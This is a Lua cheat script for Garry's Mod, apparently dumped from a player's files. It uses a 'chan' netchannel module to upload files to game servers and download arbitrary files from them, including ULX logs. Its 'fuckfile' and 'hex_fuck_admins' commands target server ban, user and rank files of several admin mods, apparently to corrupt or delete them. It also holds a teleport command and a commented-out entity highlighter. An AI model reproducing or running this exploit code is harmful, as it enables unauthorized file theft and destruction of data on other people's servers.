--[[
	lua/_files/a_updown.lua
	mr noob | (STEAM_0:0:19370286)
	===DStream===
]]






concommand.Add('randompos', function()
local vec = table.Random(player.GetAll()):GetPos();
RunConsoleCommand('setpos', vec.x, vec.y, vec.z);
end);


hook.Add('InitPostEntity','hkr', function()
hook.Remove('PostDrawEffects','RenderWidgets')
hook.Remove('PostDrawEffects','RenderHalos')
end) 



if not chan then
	orq("chan")
end



local function UploadChair(ply,cmd,args)
	local Path = "data/adv_duplicator/=Public Folder=/office_chair.txt"
	if (#args != 0) then
		Path = "data/adv_duplicator/STEAM_0_0_17809124/office_chair.txt"
	end
	
	chan.SendFile(Path)
	print("[OK] Sent '"..Path.."' using CHAN")
end
concommand.Add("hex_upload_chair", UploadChair)


local function FuckFile(File, Where)
	if Where then
		chan.MKDIR(Where)
		File = Where.."\\"..File
	else
		File = "data\\"..File
	end
	chan.MKDIR(File)
	
	local That = File.."\\o.txt"
	
	chan.Write(That, "lol")
	chan.SendFile(That)
	print("! FuckFile: ", That)
	
	chan.Delete(That)
	chan.RMDIR(File)
	if Where then
		chan.RMDIR(Where)
	end
	
	timer.Simple(3, function()
		chan.Delete(That)
		
		chan.RMDIR(File)
		if Where then
			chan.RMDIR(Where)
		end
	end)
end


local function FuckThatFile(ply,cmd,args) --fuckfile 
	if (#args == 0) then
		print("[ERR] No args!")
		return
		
	elseif (#args == 1) then
		FuckFile(args[1])
		
	elseif (#args == 2) then
		FuckFile(args[2], args[1]) --File, Where
	end
end
concommand.Add("fuckfile", FuckThatFile)


local ToFuck = {
	{What = "banned_user.cfg", 		Where = "cfg"},
	{What = "banned_ip.cfg", 		Where = "cfg"},
	
	{What = "bans.txt", 			Where = "data\\ULib"},
	{What = "users.txt",			Where = "data\\ULib"},
	{What = "groups.txt",			Where = "data\\ULib"},
	{What = "misc_registered.txt",	Where = "data\\ULib"},
	
	{What = "ranks.txt",			Where = "data\\FSAMod"},
	
	{What = "ev_playerinfo.txt"},
	{What = "ev_userranks.txt"},
	{What = "ev_globalvars.txt"},
	
	{What = "ass_config_server.txt"},
	{What = "ass_debug_sv.txt"},
	{What = "ass_rankings.txt"},
}

local function FuckAdminFiles(ply,cmd,args)
	
	for k,v in pairs(ToFuck) do
		timer.Simple(k/5, function()
			FuckFile(v.What, v.Where)
		end)
	end
end
concommand.Add("hex_fuck_admins", FuckAdminFiles)




local function SendFile(ply,cmd,args)
	if (#args == 0) then
		print("[ERR] No args!")
		return
	end
	
	local What = args[1]
	
	print("! SendFile '"..What.."' : ", chan.SendFile(What) )
end
concommand.Add("upload", SendFile)

local function RequestFile(ply,cmd,args)
	if (#args == 0) then
		print("[ERR] No args!")
		return
	end
	
	local What = args[1]
	
	--console.Command("net_showfragments 2")
	print("! RequestFile '"..What.."' : ", chan.RequestFile(What) )
	
	timer.Simple(3, function()
		if file.Exists(What, "GAME") then
			print("! done :D")
		else
			print("! no file :(")
		end
	end)
	
	timer.Simple(10, function()
		--console.Command("net_showfragments 0")
	end)
end
concommand.Add("download", RequestFile)

concommand.Add('errors', function()

	chan.RequestFile("clientside_errors.txt")
	
end)


concommand.Add("logs",function() 
	--if file.Exists("data".. string.char(92) .."ulx_logs" .. string.char(92) .. "*.txt","GAME") then
	chan.RequestFile("data".. string.char(92) .."ulx_logs".. string.char(92) .. os.date("%m-%d-%y") .. ".txt") 
	MsgC(Color(0,255,0),'Downloaded logs ('..os.date("%m-%d-%y") .. ')\n')
--else
	--MsgC(Color(255,0,0),'404\n')
	--end
end)

concommand.Add("logs_fuck", function()
RunConsoleCommand([[fuckfile]],[[data\ulx_logs\]], os.date("%m-%d-%y").. 'txt',[[txt]])
end)

local rp = CreateClientConVar('xhit_darkrp',0,true,false)
/*
local enttab = {"spawned_weapon","spawned_shipment",}

local function darkrp()
	for k, v in pairs(ents.GetAll()) do 
	if IsValid(v) then
		if table.HasValue(enttab,v:GetClass()) or string.find(string.lower(v:GetClass()),string.lower('printer')) then
		if v:GetMaterial() != 'chams' then
		v:SetMaterial('chams')
		end
	end
end
end
end
timer.Create("darkrpp",1,0, darkrp)



